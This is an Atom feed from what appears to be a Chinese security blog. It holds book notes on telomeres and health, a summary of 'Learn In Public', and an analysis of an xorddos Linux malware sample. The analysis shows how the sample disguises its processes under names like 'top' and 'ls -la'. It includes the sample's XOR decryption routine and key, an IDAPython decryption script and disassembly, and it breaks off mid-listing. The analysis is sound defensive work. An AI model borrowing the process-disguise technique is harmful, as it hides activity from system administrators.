<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>安全代码</title>
  
  
  <link href="http://usmacd.com/atom.xml" rel="self"/>
  
  <link href="http://usmacd.com/"/>
  <updated>2023-09-12T16:00:00.000Z</updated>
  <id>http://usmacd.com/</id>
  
  <author>
    <name>henices</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>端粒效应</title>
    <link href="http://usmacd.com/cn/living_younger_healthier_logger/"/>
    <id>http://usmacd.com/cn/living_younger_healthier_logger/</id>
    <published>2023-09-12T16:00:00.000Z</published>
    <updated>2023-09-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。</p><p>端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。</p><p>影响端粒变短的因素</p><ul><li>思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短</li><li>敌意：看哪儿都不对，和周围的人关系极差</li><li>悲观：对事情总有一个负面的预期</li><li>胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待</li></ul><p>缓解负面情绪的方法</p><ul><li>把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质</li><li>专注力训练：冥想</li><li>找到人生的目标：find something bigger than yourself</li></ul><p>锻炼对端粒的好处</p><ul><li>人体是反脆弱系统：锻炼的本质是对身体的适度打击</li><li>细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」</li><li>抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡</li><li>锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道</li></ul><p>两种科学的锻炼方法</p><ul><li>有氧耐力训练：长跑，每次跑四十五分钟，每周跑三次，坚持六个月，你的端粒酶的活性就能提高两倍</li><li>高强度的间歇训练：短跑结合恢复的办法，快跑几分钟，停下来慢走休息，然后再快跑</li></ul><p>节食和减肥的观念</p><ul><li>体重可能并不是肥胖的最好指标，更好的指标是 「腰臀比」</li><li>肚子大代表新陈代谢水平低，会让端粒变短</li><li>肚子大，腰臀比过高，胆固醇超标；高血压；胰岛素抵抗，具备三个就是新陈代谢综合症</li><li>饥饿节食减肥不可取，就算减下体重也很容易报复性反弹</li><li>糖可能是各种健康问题的罪魁祸首</li></ul><p>从端粒说，细胞有三个敌人</p><ul><li>细胞发炎：肥胖使细胞容易发炎，从而使端粒变短。omega-3 可以防止细胞发炎，鱼类、牛奶、有机鸡蛋中含有 omega-3 脂肪酸</li><li>氧化应激反应：维生素 C 和维生素 E 可以对抗氧化应急反应。饮食中可以吃些水果、胡萝卜、西红柿、土豆和绿叶蔬菜</li><li>胰岛素抵抗：对抗胰岛素抵抗，关键是要少吃糖</li></ul><p>从看端粒的角度分析饮食</p><ul><li>对端粒有害的食物有：红肉，加工肉类（香肠）、白面包、含糖饮料、omega-6 ，过量饮酒</li><li>对端粒有益的食物有：植物纤维、全麦、蔬菜、坚果、豆类、水果、海带、omega-3</li></ul><p>人的环境对端粒的影响</p><ul><li>城市的居民比乡村居民更容易视压力为威胁，因为城市居民的“杏仁核” 部位比较活跃，这个部位主要负责恐惧感</li><li>社会关系比金钱对端粒的影响更大，只要能满足基本的生活需求，金钱对端粒的影响就不大</li><li>受教育的程度对端粒影响很大，研究表明受教育程度越高端粒越长</li><li>职业很重要比收入对端粒影响大，一个从事基本工作的白领也比收入更高的蓝领端粒要长</li></ul><p>从端粒看，父母对孩子的影响</p><ul><li>遗传：端粒长度可以不通过基因遗传，而是“直接传递”，怀孕时父母的端粒比较短，孩子出生时端粒也就比较短</li><li>孕期压力：怀孕期间母亲的压力情况，人遇到压力会分泌皮质醇，从而影响孩子的端粒</li><li>家庭环境：越少父母的关爱，被父母忽视的孩子，端粒会比较短</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。&lt;/p&gt;
&lt;p&gt;端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Learn In Public 摘要</title>
    <link href="http://usmacd.com/en/learn_in_public/"/>
    <id>http://usmacd.com/en/learn_in_public/</id>
    <published>2023-09-06T03:49:12.921Z</published>
    <updated>2023-09-06T03:49:12.921Z</updated>
    
    <content type="html"><![CDATA[<p>source: <a href="https://www.swyx.io/learn-in-public/">https://www.swyx.io/learn-in-public/</a></p><ul><li>a habit of creating <strong>learning exhaust</strong>  <ul><li>Write blogs and tutorials and cheatsheets.  </li><li>Speak at meetups and conferences.  </li><li>Ask and answer things on Stackoverflow or Reddit.  <ul><li>Avoid the walled gardens like Slack and Discord, they’re not public.</li></ul></li><li>Make Youtube videos or Twitch streams.  </li><li>Start a newsletter.  </li><li>Draw cartoons (people loooove cartoons!)</li></ul></li><li>Whatever your thing is, make the thing you wish you had found when you were learning.  </li><li><strong>Don’t judge your results by “claps” or retweets or stars or upvotes</strong>  </li><li>Oh you think you’re done? Don’t stop there:  <ul><li>Enjoyed a coding video? Reach out to the speaker&#x2F;instructor and thank them, and ask questions.  </li><li>Make PR’s to libraries you use.  </li><li>Make your own libraries no one will ever use.  </li><li>Clone stuff you like, from scratch, to see how they work.  </li><li>Teach workshops.  </li><li>Go to conferences and summarize what you learned.</li></ul></li><li>The subheading under this rule would be: <strong>Try your best to be right, but don’t worry when you’re wrong.</strong>  <ul><li>People think you suck? Good. You agree. Ask them to explain, in detail, why you suck  </li><li>You want to just feel good or you want to <strong>be</strong> good?  <ul><li>Then go away and prove them wrong. Of course, if they get abusive block them.</li></ul></li></ul></li><li>At some point you’ll get some support behind you. People notice genuine learners. They’ll want to help you.  <ul><li>Don’t tell them, but they just became your mentors.  </li><li>This is very important: Pick up what they put down  </li><li>Because you learn in public. By teaching you, they teach many.</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;source: &lt;a href=&quot;https://www.swyx.io/learn-in-public/&quot;&gt;https://www.swyx.io/learn-in-public/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a habit of creating &lt;strong&gt;</summary>
      
    
    
    
    
    <category term="PKM" scheme="http://usmacd.com/tags/PKM/"/>
    
  </entry>
  
  <entry>
    <title>xorddos 样本进程隐藏的小伎俩</title>
    <link href="http://usmacd.com/cn/xorddos_hide/"/>
    <id>http://usmacd.com/cn/xorddos_hide/</id>
    <published>2023-09-06T03:00:51.915Z</published>
    <updated>2023-09-06T03:00:51.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><p>上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，<br>变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ps -ef  | grep /usr/bin</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helper</span><br><span class="line">root      4598  4594  0 00:37 pts/1    00:00:00 bash</span><br><span class="line">oracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcl</span><br><span class="line">oracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcl</span><br><span class="line">oracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcl</span><br><span class="line">oracle    5588     1  0 00:42 ?        00:00:00 ora_j001_orcl</span><br><span class="line">root      5666     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5669     1  0 00:43 ?        00:00:00 <span class="built_in">echo</span> <span class="string">&quot;find&quot;</span></span><br><span class="line">root      5672     1  0 00:43 ?        00:00:00 <span class="built_in">ls</span> -la</span><br><span class="line">root      5675     1  0 00:43 ?        00:00:00 bash</span><br><span class="line">root      5678     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5683     1  0 00:43 ?        00:00:00 <span class="built_in">cd</span> /etc</span><br><span class="line">root      5686     1  0 00:43 ?        00:00:00 top</span><br><span class="line">root      5689     1  0 00:43 ?        00:00:00 sh</span><br><span class="line">root      5692     1  0 00:43 ?        00:00:00 gnome-terminal</span><br><span class="line">root      5695     1  0 00:43 ?        00:00:00 ifconfig</span><br><span class="line">root      5696  4598  0 00:43 pts/1    00:00:00 ps -ef</span><br></pre></td></tr></table></figure><p>而使用lsof却可以清除地看见样本正在努力地干活。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># lsof +d /usr/bin</span></span><br><span class="line">COMMAND    PID USER  FD   TYPE DEVICE    SIZE    NODE NAME</span><br><span class="line">hidd      1853 root txt    REG    3,1   33708 2467454 /usr/bin/hidd</span><br><span class="line">ckucbzknt 2014 root txt    REG    3,1  610331 2459176 /usr/bin/ckucbzkntb</span><br><span class="line">xfs       2143  xfs txt    REG    3,1  107460 2468483 /usr/bin/xfs</span><br><span class="line">Xorg      3117 root txt    REG    3,1 1890596 2466732 /usr/bin/Xorg</span><br><span class="line">gnome-ses 4073 root txt    REG    3,1  129356 2459482 /usr/bin/gnome-session</span><br><span class="line">ssh-agent 4201 root txt    REG    3,1   88996 2467513 /usr/bin/ssh-agent</span><br><span class="line">dbus-laun 4245 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-key 4255 root txt    REG    3,1   97396 2473617 /usr/bin/gnome-keyring-daemon</span><br><span class="line">metacity  4290 root txt    REG    3,1  521080 2464500 /usr/bin/metacity</span><br><span class="line">gnome-pan 4296 root txt    REG    3,1  540868 2465177 /usr/bin/gnome-panel</span><br><span class="line">nautilus  4298 root txt    REG    3,1 1348932 2461620 /usr/bin/nautilus</span><br><span class="line">gnome-vol 4310 root txt    REG    3,1   65240 2464498 /usr/bin/gnome-volume-manager</span><br><span class="line">bt-applet 4334 root txt    REG    3,1   30452 2464773 /usr/bin/bt-applet</span><br><span class="line">nm-applet 4352 root txt    REG    3,1  312432 2467723 /usr/bin/nm-applet</span><br><span class="line">gnome-pow 4381 root txt    REG    3,1  195284 2459473 /usr/bin/gnome-power-manager</span><br><span class="line">pam-panel 4383 root txt    REG    3,1   39148 2461862 /usr/bin/pam-panel-icon</span><br><span class="line">dbus-laun 4473 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch</span><br><span class="line">gnome-scr 4512 root txt    REG    3,1  168628 2468487 /usr/bin/gnome-screensaver</span><br><span class="line">gnome-ter 4594 root txt    REG    3,1  309368 2464648 /usr/bin/gnome-terminal</span><br><span class="line">gadcgkcqn 4681 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4684 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4687 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4690 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br><span class="line">gadcgkcqn 4693 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni</span><br></pre></td></tr></table></figure><p>阅读汇编代码，分析具体原因，发现xorddos将一些关键信息加密了，F5处理过的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">encrypt_code</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ecx@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>)</span><br><span class="line">                                   - ((<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)];</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 != a2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorkey 为 BB2FA36AAA9541F0</p><p>用idapython 写个小脚本，简单处理一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_string</span>(<span class="params">addr</span>):</span><br><span class="line">  out = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> Byte(addr) != <span class="number">0</span>:</span><br><span class="line">      out += <span class="built_in">chr</span>(Byte(addr))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line"></span><br><span class="line">  xorkey = <span class="string">&#x27;BB2FA36AAA9541F0&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(data)</span><br><span class="line">  o = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> length &gt; <span class="number">0</span>:</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> v2 &lt; length:</span><br><span class="line">      o += <span class="built_in">chr</span>( <span class="built_in">ord</span>(data[v2]) ^  <span class="built_in">ord</span>(xorkey[((v2 + ((v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &amp; <span class="number">0xF</span>) - ( (v2 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)]) )</span><br><span class="line">      v2 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">ea = ScreenEA()</span><br><span class="line">string = get_string(ea)</span><br><span class="line">dec = decrypt(string)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Addr: 0x%x, %s&#x27;</span> % (ea, dec)</span><br><span class="line">MakeComm(ea, dec)</span><br></pre></td></tr></table></figure><p>处理后可以看到伪装的命令行信息，daemonname。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.data:080CBB40 daemonname      db &#x27;!#Ff3VE.-7&#x27;,17h,&#x27;V[_ 0&#x27;,0 ; DATA XREF: main+31Eo</span><br><span class="line">.data:080CBB40                                         ; main+4AEo ...</span><br><span class="line">.data:080CBB40                                         ; cat resolv.conf</span><br><span class="line">.data:080CBB51                 align 4</span><br><span class="line">.data:080CBB54 a12             db &#x27;1*2&#x27;,0              ; sh</span><br><span class="line">.data:080CBB58                 db    0</span><br><span class="line">.data:080CBB59                 db    0</span><br><span class="line">.data:080CBB5A                 db    0</span><br><span class="line">.data:080CBB5B                 db    0</span><br><span class="line">.data:080CBB5C                 db    0</span><br><span class="line">.data:080CBB5D                 db    0</span><br><span class="line">.data:080CBB5E                 db    0</span><br><span class="line">.data:080CBB5F                 db    0</span><br><span class="line">.data:080CBB60                 db    0</span><br><span class="line">.data:080CBB61                 db    0</span><br><span class="line">.data:080CBB62                 db    0</span><br><span class="line">.data:080CBB63                 db    0</span><br><span class="line">.data:080CBB64                 db    0</span><br><span class="line">.data:080CBB65                 db    0</span><br><span class="line">.data:080CBB66                 db    0</span><br><span class="line">.data:080CBB67                 db    0</span><br><span class="line">.data:080CBB68                 db  20h                 ; bash</span><br><span class="line">.data:080CBB69                 db  23h ; #</span><br><span class="line">.data:080CBB6A                 db  41h ; A</span><br><span class="line">.data:080CBB6B                 db  2Eh ; .</span><br><span class="line">.data:080CBB6C                 db  41h ; A</span><br><span class="line">.data:080CBB6D                 db    0</span><br><span class="line">.data:080CBB6E                 db    0</span><br><span class="line">.data:080CBB6F                 db    0</span><br><span class="line">.data:080CBB70                 db    0</span><br><span class="line">.data:080CBB71                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.data:080CBBB8                 db  2Eh ; .             ; ls -la</span><br><span class="line">.data:080CBBB9                 db  31h ; 1</span><br><span class="line">.data:080CBBBA                 db  12h</span><br><span class="line">.data:080CBBBB                 db  6Bh ; k</span><br><span class="line">.data:080CBBBC                 db  2Dh ; -</span><br><span class="line">.data:080CBBBD                 db  52h ; R</span><br><span class="line">.data:080CBBBE                 db  36h ; 6</span><br><span class="line">.data:080CBBBF                 db    0</span><br><span class="line">.data:080CBBC0                 db    0</span><br><span class="line">.data:080CBBC1                 db    0</span><br><span class="line">.data:080CBBC2                 db    0</span><br><span class="line">.data:080CBBC3                 db    0</span><br><span class="line">.data:080CBBC4                 db    0</span><br><span class="line">.data:080CBBC5                 db    0</span><br><span class="line">.data:080CBBC6                 db    0</span><br><span class="line">.data:080CBBC7                 db    0</span><br><span class="line">.data:080CBBC8                 db    0</span><br><span class="line">.data:080CBBC9                 db    0</span><br><span class="line">.data:080CBBCA                 db    0</span><br><span class="line">.data:080CBBCB                 db    0</span><br><span class="line">.data:080CBBCC                 db  36h ; 6             ; top</span><br><span class="line">.data:080CBBCD                 db  2Dh ; -</span><br><span class="line">.data:080CBBCE                 db  42h ; B</span><br><span class="line">.data:080CBBCF                 db  46h ; F</span><br><span class="line">.data:080CBBD0                 db    0</span><br><span class="line">.data:080CBBD1                 db    0</span><br><span class="line">.data:080CBBD2                 db    0</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>呵呵，已经看到 top， ls -al 等信息了，查看daemonname 的交叉引用，发现在main函数<br>中，到main里看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804AC30 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0804AC30                 public main</span><br><span class="line">.text:0804AC30 main            proc near               ; DATA XREF: _start+17o</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:0804AF4E                 mov     ebx, offset daemonname ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">.text:0804AFC2 loc_804AFC2:                            ; CODE XREF: main+3ABj</span><br><span class="line">.text:0804AFC2                 mov     [esp], ebx</span><br><span class="line">.text:0804AFC5                 add     ebx, 14h</span><br><span class="line">.text:0804AFC8                 mov     dword ptr [esp+4], 14h</span><br><span class="line">.text:0804AFD0                 call    encrypt_code</span><br><span class="line">.text:0804AFD5                 cmp     ebx, offset unk_80CBD0C</span><br><span class="line">.text:0804AFDB                 jnz     short loc_804AFC2</span><br></pre></td></tr></table></figure><p>这段汇编代码，使用了一个循环，调用encrypt_code 对daemonname进行了解密。<br>后面的代码，用到了daemonname的地方有下面几处，</p><p>第一处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B29F                 call    getpid</span><br><span class="line">.text:0804B2A4                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B2AC                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B2B4                 mov     [esp], esi             ；第三形参 pid</span><br><span class="line">.text:0804B2B7                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B2BB                 call    snprintf</span><br><span class="line">.text:0804B2C0                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B2C8                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B2CF                 call    randomid</span><br><span class="line">.text:0804B2D4                 mov     [esp+8], esi</span><br><span class="line">.text:0804B2D8                 mov     [esp], edi             ；第一形参 要跑的木马</span><br><span class="line">.text:0804B2DB                 movzx   eax, ax</span><br><span class="line">.text:0804B2DE                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B2E1                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B2E8                 mov     [esp+4], eax           ; 第二形参  daemonname</span><br><span class="line">.text:0804B2EC                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>第二处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B932                 lea     edx, [ebp+var_1888]</span><br><span class="line">.text:0804B938                 add     ebx, 1</span><br><span class="line">.text:0804B93B                 mov     [esp], edx</span><br><span class="line">.text:0804B93E                 call    randmd5</span><br><span class="line">.text:0804B943                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B94A                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B951                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804B957                 call    getpid</span><br><span class="line">.text:0804B95C                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804B964                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804B96C                 mov     [esp], esi</span><br><span class="line">.text:0804B96F                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804B973                 call    snprintf</span><br><span class="line">.text:0804B978                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804B980                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804B987                 call    randomid</span><br><span class="line">.text:0804B98C                 mov     [esp+8], esi</span><br><span class="line">.text:0804B990                 movzx   eax, ax</span><br><span class="line">.text:0804B993                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804B996                 lea     eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="line">.text:0804B99D                 mov     [esp+4], eax</span><br><span class="line">.text:0804B9A1                 lea     eax, [ebp+var_1888]</span><br><span class="line">.text:0804B9A7                 mov     [esp], eax</span><br><span class="line">.text:0804B9AA                 call    LinuxExec_Argv2</span><br></pre></td></tr></table></figure><p>第三处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0804B9DF                 lea     edx, [ebp+var_1C88]</span><br><span class="line">.text:0804B9E5                 add     ebx, 1</span><br><span class="line">.text:0804B9E8                 mov     [esp], edx</span><br><span class="line">.text:0804B9EB                 call    randmd5</span><br><span class="line">.text:0804B9F0                 mov     [ebp+var_22], 0</span><br><span class="line">.text:0804B9F7                 mov     [ebp+var_1E], 0</span><br><span class="line">.text:0804B9FE                 mov     [ebp+var_1A], 0</span><br><span class="line">.text:0804BA04                 call    getpid</span><br><span class="line">.text:0804BA09                 mov     dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;</span><br><span class="line">.text:0804BA11                 mov     dword ptr [esp+4], 0Ah</span><br><span class="line">.text:0804BA19                 mov     [esp], esi</span><br><span class="line">.text:0804BA1C                 mov     [esp+0Ch], eax</span><br><span class="line">.text:0804BA20                 call    snprintf</span><br><span class="line">.text:0804BA25                 mov     dword ptr [esp+4], 17h</span><br><span class="line">.text:0804BA2D                 mov     dword ptr [esp], 0</span><br><span class="line">.text:0804BA34                 call    randomid</span><br><span class="line">.text:0804BA39                 mov     [esp+8], esi</span><br><span class="line">.text:0804BA3D                 movzx   eax, ax</span><br><span class="line">.text:0804BA40                 lea     eax, [eax+eax*4]</span><br><span class="line">.text:0804BA43                 lea     eax, 